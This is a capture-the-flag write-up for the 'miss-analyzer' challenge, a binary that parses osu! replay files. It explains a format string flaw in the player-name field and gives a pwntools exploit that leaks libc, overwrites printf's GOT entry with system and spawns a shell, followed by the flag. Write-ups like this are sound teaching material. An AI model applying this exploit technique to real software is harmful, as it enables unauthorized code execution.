# miss-analyzer
![challenge](challenge.png)
### Challenge:
##### I made a program to analyze the misses in my replays!
##### Files: [analyzer](analyzer)
##### Links: ```nc chal.osugaming.lol 7273```

### Solution:
The binary is an analyzer for osu! replay files, we can visit this link for more informations: 
[https://osu.ppy.sh/wiki/en/Client/File_formats/osr_(file_format)](https://osu.ppy.sh/wiki/en/Client/File_formats/osr_(file_format)).

There's a format string vulnerability when printing the name of the player in the replay, so our strategy becomes forging
a replay file with our fmt payload as the player's name.

We can look on how replay files are structured from the previous link, after that it becomes a simple format string vuln challenge.

```py
r = conn()

    #https://osu.ppy.sh/wiki/en/Client/File_formats/osr_%28file_format%29
    def construct_string(value):
        return b"\x0b" + leb128.u.encode(len(value)) + value


    fmt = b"%15$sAAA" + p64(exe.got.puts)
    payload = b"\x00" + p32(0x20) + construct_string(b"aa") + construct_string(fmt) + construct_string(b"aa") + p16(0x20)*6
    r.sendline(payload.hex())

    r.recvuntil(b"Player name: ")
    leak=u64(r.recvuntil(b"AAA")[:-3].ljust(8, b"\x00"))
    libc.address = leak - libc.sym.puts

    fmt = fmtstr_payload(14, {exe.got.printf:libc.sym.system})
    payload = b"\x00" + p32(0x20) + construct_string(b"aa") + construct_string(fmt) + construct_string(b"aa") + p16(0x20)*6
    r.sendline(payload.hex())

    payload = b"\x00" + p32(0x20) + construct_string(b"aa") + construct_string(b"/bin/sh") + construct_string(b"aa") + p16(0x20)*6
    r.sendline(payload.hex())

    r.interactive()
    #osu{1_h4te_c!!!!!!!!}
```

We first leak the libc by reading an address from the got, then we overwrite printf with system, send /bin/sh and get our shell.

Script: [solve.py](solve.py)

Flag: ```osu{1_h4te_c!!!!!!!!}```